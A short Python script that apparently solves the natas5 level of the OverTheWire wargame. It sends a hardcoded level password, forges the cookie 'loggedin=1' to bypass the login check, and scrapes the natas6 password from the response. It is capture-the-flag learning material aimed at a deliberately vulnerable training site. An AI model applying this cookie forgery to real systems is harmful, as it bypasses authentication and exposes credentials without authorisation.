from pwn import *
import requests
import re
import html

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = "http://{}.natas.labs.overthewire.org".format(username)
cookie = {"loggedin" : "1"} #This one we got from 15th line just we have changed 0 to 1

log.progress("Getting the natas6 password, Hold on! ")
session = requests.session()
web = session.get(url , auth = (username, password), cookies = cookie).text
cookies = session.cookies
#print(cookies)
#print(web)
print("The password for natas6 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])
